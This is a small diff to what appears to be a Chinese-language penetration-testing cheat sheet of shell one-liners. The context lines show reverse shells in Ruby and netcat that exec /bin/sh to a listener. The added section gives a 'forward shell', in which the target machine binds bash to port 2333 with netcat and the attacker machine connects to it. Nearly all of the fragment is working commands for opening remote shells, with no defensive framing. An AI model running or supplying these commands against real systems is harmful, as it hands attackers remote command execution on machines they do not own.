@@ -67,6 +67,17 @@ ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",233).to_i;exec sprintf("/bin/sh -i
 nc -e /bin/sh 127.0.0.1 2333
 ```
 
+正向弹
+
+靶机：
+```bash
+nc -lvvp 2333 -e /bin/bash
+```
+
+攻击机
+```
+nc ip 2333
+```
 ## 获取Bash交互行
 
 ```
